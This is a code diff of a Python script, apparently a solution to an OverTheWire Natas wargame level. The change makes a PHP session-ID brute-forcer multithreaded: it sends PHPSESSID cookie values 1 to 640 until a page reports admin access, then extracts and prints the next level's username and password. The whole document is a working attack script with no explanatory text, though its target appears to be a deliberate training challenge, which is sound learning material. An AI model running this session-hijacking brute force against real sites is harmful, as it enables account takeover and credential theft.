@@ -1,10 +1,20 @@
 # PHP SessionID Bruteforce
 
 import re
+import threading
 import requests
 import colorama
-from bs4 import BeautifulSoup
 from colorama import Fore, Style
+
+
+def sessionIdBruteforce(i):
+    resp = session.get(url=url, cookies={"PHPSESSID": str(i)})
+
+    if "You are an admin" in resp.text:
+        natas19_username = re.search("Username: (.*)", resp.text).group(1)
+        natas19_password = re.search("Password: (.*)</pre>", resp.text).group(1)
+
+        print(f"\n[+] {natas19_username}: {natas19_password}")
 
 
 # Initialize colorama for colored console output
@@ -29,12 +39,16 @@ session = requests.Session()
 session.auth = (username, password)
 
 
-for i in range(1, 641):
-    resp = session.get(url=url, cookies={"PHPSESSID": str(i)})
+# Empty Thread lists
+threads = []
 
-    if "You are an admin" in resp.text:
-        soup = BeautifulSoup(resp.text, 'lxml')
-        print(re.sub("View sourcecode", "", soup.div.text))
-        break
-    else:
-        print(f"[-] Brute forcing PHPSESSID: {i}")
+
+for i in range(1, 641):
+    thread = threading.Thread(target=sessionIdBruteforce, args=(i,))
+    thread.start()
+    threads.append(thread)
+
+
+# Wait for all threads to finish
+for thread in threads:
+    thread.join()
